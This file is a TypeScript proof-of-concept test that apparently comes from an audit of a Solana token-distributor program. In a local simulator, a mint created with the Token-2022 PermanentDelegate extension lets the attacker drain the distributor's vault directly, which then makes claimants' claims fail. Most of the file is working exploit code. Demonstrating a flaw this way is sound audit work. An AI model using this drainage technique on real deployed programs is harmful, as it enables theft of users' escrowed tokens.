// oken-2022 PermanentDelegate Vault Drainage
//
// The distributor program enforces no extension check on token_mint.
// A mint with the PermanentDelegate extension lets the delegate call Token-2022's
// transfer_checked directly on the vault, bypassing the program entirely.
//
// Run:
//   cd lib/boost-tokendistributor-solana
//   anchor build
//   npm install --legacy-peer-deps
//   ./node_modules/.bin/ts-mocha -t 60000 tests/poc_v01_permanent_delegate.ts

import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { TokenDistributor } from "../target/types/token_distributor";
import {
  ExtensionType,
  TOKEN_2022_PROGRAM_ID,
  getMintLen,
  getAccountLen,
  createInitializeMintInstruction,
  createInitializePermanentDelegateInstruction,
  createInitializeAccountInstruction,
  createMintToInstruction,
  createTransferCheckedInstruction,
  getAccount,
} from "@solana/spl-token";
import { LiteSVM } from "litesvm";
import {
  Keypair,
  LAMPORTS_PER_SOL,
  PublicKey,
  SystemProgram,
  Transaction,
} from "@solana/web3.js";
import * as fs from "fs";
import * as crypto from "crypto";
import { assert } from "chai";

// ── Constants ─────────────────────────────────────────────────────────────────
const DISTRIBUTOR_SEED = "distributor";
const OWNER_NONCE_SEED = "owner_nonce";
const VAULT_SEED       = "vault";
const CLAIM_SEED       = "claim";

const NOMINAL_AMOUNT         = 1000n;
const DECIMALS               = 0;
const ERR_INSUFFICIENT_VAULT = 6014; // anchor offset 6000 + index of InsufficientVaultBalance

// ── LiteSVM helpers ───────────────────────────────────────────────────────────
function advanceSlot(svm: LiteSVM): void {
  const clock = svm.getClock();
  clock.slot += 1n;
  svm.setClock(clock);
}

function sendTx(
  svm: LiteSVM,
  feePayer: Keypair,
  tx: Transaction,
  signers: Keypair[],
): unknown {
  advanceSlot(svm);
  tx.recentBlockhash = svm.latestBlockhash();
  tx.feePayer = feePayer.publicKey;
  tx.sign(...signers);
  return svm.sendTransaction(tx);
}

function isFailure(result: unknown): boolean {
  const s = String(result);
  return (
    s.includes("FailedTransactionMetadata") ||
    s.includes("TransactionError") ||
    (s !== "undefined" && s.includes("Error"))
  );
}

class LiteSVMConnection {
  private readonly svm: LiteSVM;
  constructor(svm: LiteSVM) {
    this.svm = svm;
  }
  async getLatestBlockhash() {
    return { blockhash: this.svm.latestBlockhash(), lastValidBlockHeight: 0 };
  }
  async getMinimumBalanceForRentExemption() {
    return 0;
  }
  async getAccountInfo(pubkey: PublicKey) {
    const account = this.svm.getAccount(pubkey);
    if (!account) return null;
    return {
      executable: account.executable,
      owner: account.owner,
      lamports: Number(account.lamports),
      data: Buffer.from(account.data),
      rentEpoch: 0,
    };
  }
  async getAccountInfoAndContext(pubkey: PublicKey) {
    return {
      context: { slot: Number(this.svm.getClock().slot) },
      value: await this.getAccountInfo(pubkey),
    };
  }
  async getMultipleAccountsInfo(pubkeys: PublicKey[]) {
    return Promise.all(pubkeys.map((p) => this.getAccountInfo(p)));
  }
}

// ── Token-2022 helpers ────────────────────────────────────────────────────────

// Creates a Token-2022 mint with PermanentDelegate = delegate.
function createPermanentDelegateMint(
  svm:      LiteSVM,
  payer:    Keypair,
  mintAuth: PublicKey,
  delegate: PublicKey,
): Keypair {
  const mint    = Keypair.generate();
  const mintLen = getMintLen([ExtensionType.PermanentDelegate]);
  const tx = new Transaction().add(
    SystemProgram.createAccount({
      fromPubkey:       payer.publicKey,
      newAccountPubkey: mint.publicKey,
      lamports:         5_000_000,
      space:            mintLen,
      programId:        TOKEN_2022_PROGRAM_ID,
    }),
    // PermanentDelegate must be initialised before InitializeMint
    createInitializePermanentDelegateInstruction(
      mint.publicKey,
      delegate,
      TOKEN_2022_PROGRAM_ID,
    ),
    createInitializeMintInstruction(
      mint.publicKey,
      DECIMALS,
      mintAuth,
      null,
      TOKEN_2022_PROGRAM_ID,
    ),
  );
  sendTx(svm, payer, tx, [payer, mint]);
  return mint;
}

// Creates a standard Token-2022 token account (no account-level extensions required
// for PermanentDelegate — the extension lives on the mint, not on token accounts).
function createTokenAccount(
  svm:   LiteSVM,
  mint:  PublicKey,
  owner: PublicKey,
  payer: Keypair,
): Keypair {
  const account    = Keypair.generate();
  const accountLen = getAccountLen([]); // no account extensions needed
  const tx = new Transaction().add(
    SystemProgram.createAccount({
      fromPubkey:       payer.publicKey,
      newAccountPubkey: account.publicKey,
      lamports:         5_000_000,
      space:            accountLen,
      programId:        TOKEN_2022_PROGRAM_ID,
    }),
    createInitializeAccountInstruction(
      account.publicKey,
      mint,
      owner,
      TOKEN_2022_PROGRAM_ID,
    ),
  );
  sendTx(svm, payer, tx, [payer, account]);
  return account;
}

function merkleLeaf(claimant: PublicKey, amount: bigint): Buffer {
  const amtBuf = Buffer.alloc(8);
  amtBuf.writeBigUInt64LE(amount);
  return crypto
    .createHash("sha256")
    .update(Buffer.concat([claimant.toBuffer(), amtBuf]))
    .digest();
}

// ── Test suite ────────────────────────────────────────────────────────────────
describe("token_distributor — PermanentDelegate vault drainage", () => {
  let svm:        LiteSVM;
  let program:    Program<TokenDistributor>;
  let programId:  PublicKey;
  let connection: LiteSVMConnection;

  // owner and claimant are victims; attacker controls the mint (permanent delegate)
  let owner:    Keypair;
  let operator: Keypair;
  let claimant: Keypair;
  let attacker: Keypair;

  let mint:        Keypair;
  let ownerAta:    Keypair;
  let claimantAta: Keypair;
  let attackerAta: Keypair;

  let ownerNoncePda:     PublicKey;
  let distributorPda:   PublicKey;
  let vaultPda:          PublicKey;
  let claimStatusPda:    PublicKey;
  let eventAuthorityPda: PublicKey;

  before(async () => {
    svm = new LiteSVM();
    const programBytes = fs.readFileSync("./target/deploy/token_distributor.so");
    const idl = JSON.parse(
      fs.readFileSync("./target/idl/token_distributor.json", "utf8"),
    );
    programId = new PublicKey(idl.address);
    svm.addProgram(programId, programBytes);

    owner    = Keypair.generate();
    operator = Keypair.generate();
    claimant = Keypair.generate();
    attacker = Keypair.generate(); // permanent delegate authority

    svm.airdrop(owner.publicKey,    BigInt(100 * LAMPORTS_PER_SOL));
    svm.airdrop(operator.publicKey, BigInt(LAMPORTS_PER_SOL));
    svm.airdrop(claimant.publicKey, BigInt(LAMPORTS_PER_SOL));
    svm.airdrop(attacker.publicKey, BigInt(10 * LAMPORTS_PER_SOL));

    // Attacker creates the mint with themselves as permanent delegate and mint authority.
    // In a real attack the attacker could also distribute these tokens to a victim
    // operator who then trustingly creates a distributor.
    mint = createPermanentDelegateMint(
      svm,
      attacker,           // payer
      attacker.publicKey, // mint authority
      attacker.publicKey, // permanent delegate = attacker
    );
    ownerAta    = createTokenAccount(svm, mint.publicKey, owner.publicKey,    attacker);
    claimantAta = createTokenAccount(svm, mint.publicKey, claimant.publicKey, attacker);
    attackerAta = createTokenAccount(svm, mint.publicKey, attacker.publicKey, attacker);

    // Attacker mints tokens into owner's account (simulating a token sale / distribution)
    sendTx(svm, attacker, new Transaction().add(
      createMintToInstruction(
        mint.publicKey,
        ownerAta.publicKey,
        attacker.publicKey,
        Number(NOMINAL_AMOUNT),
        [],
        TOKEN_2022_PROGRAM_ID,
      ),
    ), [attacker]);

    connection = new LiteSVMConnection(svm);
    const provider = new anchor.AnchorProvider(
      connection as any,
      new anchor.Wallet(owner),
      { commitment: "processed" },
    );
    program = new anchor.Program(idl as anchor.Idl, provider) as Program<TokenDistributor>;

    [ownerNoncePda] = PublicKey.findProgramAddressSync(
      [Buffer.from(OWNER_NONCE_SEED), owner.publicKey.toBuffer()],
      programId,
    );
    const nonceBuf = new anchor.BN(1).toArrayLike(Buffer, "le", 4);
    [distributorPda] = PublicKey.findProgramAddressSync(
      [
        Buffer.from(DISTRIBUTOR_SEED),
        mint.publicKey.toBuffer(),
        owner.publicKey.toBuffer(),
        nonceBuf,
      ],
      programId,
    );
    [vaultPda] = PublicKey.findProgramAddressSync(
      [Buffer.from(VAULT_SEED), distributorPda.toBuffer()],
      programId,
    );
    [claimStatusPda] = PublicKey.findProgramAddressSync(
      [
        Buffer.from(CLAIM_SEED),
        distributorPda.toBuffer(),
        claimant.publicKey.toBuffer(),
      ],
      programId,
    );
    [eventAuthorityPda] = PublicKey.findProgramAddressSync(
      [Buffer.from("__event_authority")],
      programId,
    );
  });

  // ── Test 1: program accepts the mint with no extension check ─────────────────
  it("create_distributor accepts PermanentDelegate mint — vault holds full 1000 tokens", async () => {
    const ix = await program.methods
      .createDistributor(new anchor.BN(NOMINAL_AMOUNT.toString()))
      .accounts({
        ownerNonce:        ownerNoncePda,
        distributor:       distributorPda,
        tokenVault:        vaultPda,
        tokenMint:         mint.publicKey,
        ownerTokenAccount: ownerAta.publicKey,
        owner:             owner.publicKey,
        operator:          operator.publicKey,
        systemProgram:     SystemProgram.programId,
        tokenProgram:      TOKEN_2022_PROGRAM_ID,
        rent:              anchor.web3.SYSVAR_RENT_PUBKEY,
        eventAuthority:    eventAuthorityPda,
        program:           programId,
      })
      .instruction();

    const result = sendTx(svm, owner, new Transaction().add(ix), [owner]);
    assert.isFalse(isFailure(result), `create_distributor must succeed: ${result}`);

    const vault = await getAccount(
      connection as any, vaultPda, undefined, TOKEN_2022_PROGRAM_ID,
    );
    const distributorState = await program.account.tokenDistributor.fetch(distributorPda);

    assert.equal(
      distributorState.initialTotalAmount.toString(),
      NOMINAL_AMOUNT.toString(),
      "distributor records 1000 (nominal)",
    );
    assert.equal(
      vault.amount.toString(),
      NOMINAL_AMOUNT.toString(),
      "vault holds 1000 (PermanentDelegate has no fee on transfer)",
    );

    console.log("  ✔ create_distributor accepted the PermanentDelegate mint — no runtime rejection");
    console.log(`  distributor.initial_total_amount = ${distributorState.initialTotalAmount}`);
    console.log(`  vault.amount                     = ${vault.amount}`);
  });

  // ── Test 2: attacker drains vault directly through Token-2022 ────────────────
  it("attacker drains vault via direct Token-2022 transfer — zero program interaction", async () => {
    const vaultBefore = await getAccount(
      connection as any, vaultPda, undefined, TOKEN_2022_PROGRAM_ID,
    );
    assert.equal(
      vaultBefore.amount.toString(),
      NOMINAL_AMOUNT.toString(),
      "vault starts with 1000",
    );

    // ATTACK: attacker constructs a raw Token-2022 transfer_checked instruction.
    // The vault's normal authority is the distributor PDA — attacker cannot produce its
    // signature. But Token-2022 recognises the PermanentDelegate as a valid override
    // authority, so no PDA signature is required.
    const drainIx = createTransferCheckedInstruction(
      vaultPda,               // source:    distributor's vault (not owned by attacker)
      mint.publicKey,
      attackerAta.publicKey,  // dest:      attacker-controlled account
      attacker.publicKey,     // authority: permanent delegate — bypasses PDA authority
      Number(NOMINAL_AMOUNT),
      DECIMALS,
      [],
      TOKEN_2022_PROGRAM_ID,
    );

    const drainResult = sendTx(svm, attacker, new Transaction().add(drainIx), [attacker]);
    assert.isFalse(
      isFailure(drainResult),
      `drain transaction must succeed (permanent delegate override): ${drainResult}`,
    );

    const vaultAfter   = await getAccount(connection as any, vaultPda,       undefined, TOKEN_2022_PROGRAM_ID);
    const attackerAcct = await getAccount(connection as any, attackerAta.publicKey, undefined, TOKEN_2022_PROGRAM_ID);

    assert.equal(vaultAfter.amount.toString(),   "0",                       "vault emptied");
    assert.equal(attackerAcct.amount.toString(), NOMINAL_AMOUNT.toString(), "attacker holds all drained tokens");

    console.log("  ✔ attacker drained vault without calling a single distributor instruction");
    console.log(`  vault.amount after drain: ${vaultAfter.amount}`);
    console.log(`  attacker balance:         ${attackerAcct.amount}`);
  });

  // ── Test 3: operator sets up distribution — claims fail on the empty vault ───
  it("claim(1000) fails with InsufficientVaultBalance after attacker drained vault", async () => {
    // Configure distribution so the timing checks pass — only the vault check fails
    const leaf = merkleLeaf(claimant.publicKey, NOMINAL_AMOUNT);
    sendTx(svm, operator, new Transaction().add(
      await program.methods
        .setMerkleRoot(Array.from(leaf))
        .accounts({ distributor: distributorPda, operator: operator.publicKey, eventAuthority: eventAuthorityPda, program: programId })
        .instruction(),
    ), [operator]);

    const clock     = svm.getClock();
    const startTime = Number(clock.unixTimestamp) + 5;
    sendTx(svm, operator, new Transaction().add(
      await program.methods
        .setTime(new anchor.BN(startTime))
        .accounts({ distributor: distributorPda, operator: operator.publicKey, eventAuthority: eventAuthorityPda, program: programId })
        .instruction(),
    ), [operator]);

    const newClock = svm.getClock();
    newClock.unixTimestamp = BigInt(startTime + 1);
    newClock.slot += 1n;
    svm.setClock(newClock);

    const claimIx = await program.methods
      .claim(new anchor.BN(NOMINAL_AMOUNT.toString()), [])
      .accounts({
        distributor:          distributorPda,
        claimStatus:          claimStatusPda,
        tokenVault:           vaultPda,
        claimantTokenAccount: claimantAta.publicKey,
        tokenMint:            mint.publicKey,
        claimant:             claimant.publicKey,
        systemProgram:        SystemProgram.programId,
        tokenProgram:         TOKEN_2022_PROGRAM_ID,
        eventAuthority:       eventAuthorityPda,
        program:              programId,
      })
      .instruction();

    let claimFailed = false;
    let claimResult: unknown;
    try {
      claimResult = sendTx(svm, claimant, new Transaction().add(claimIx), [claimant]);
      if (isFailure(claimResult)) claimFailed = true;
    } catch (e) {
      claimFailed  = true;
      claimResult  = e;
    }

    assert.isTrue(claimFailed, `claim must fail on empty vault; result: ${claimResult}`);

    const claimantAcct = await getAccount(
      connection as any, claimantAta.publicKey, undefined, TOKEN_2022_PROGRAM_ID,
    );
    assert.equal(claimantAcct.amount.toString(), "0", "claimant received 0 tokens");

    const resultStr = String(claimResult);
    if (resultStr.includes("Custom(")) {
      assert.match(
        resultStr,
        new RegExp(`Custom\\(${ERR_INSUFFICIENT_VAULT}\\)`),
        `expected InsufficientVaultBalance (${ERR_INSUFFICIENT_VAULT})`,
      );
      console.log(`  ✔ claim reverted with Custom(${ERR_INSUFFICIENT_VAULT}) = InsufficientVaultBalance`);
    } else {
      console.log(`  ✔ claim reverted: ${resultStr.slice(0, 120)}`);
    }
    console.log("  claimant received: 0 tokens (vault drained by attacker before distribution opened)");
  });
});
